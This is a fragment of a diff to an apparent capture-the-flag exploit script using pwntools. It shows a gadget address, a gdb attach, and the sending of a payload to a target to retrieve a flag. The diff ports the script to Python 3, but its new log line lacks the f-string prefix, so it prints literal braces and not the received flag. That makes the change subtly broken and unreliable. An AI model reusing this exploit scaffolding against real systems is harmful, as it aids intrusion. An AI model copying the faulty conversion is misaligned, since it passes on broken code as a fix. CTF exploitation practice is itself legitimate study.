@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 from pwn import *
 
 inc_ecx_addr = 0x080488ba
@@ -68,5 +70,4 @@ gdb.attach(p, '''
 p.recvuntil('> ')
 p.sendline(payload)
 
-print "Flag:", p.recv(1024)
-
+log.info("Flag: {p.recv(1024).decode()}")
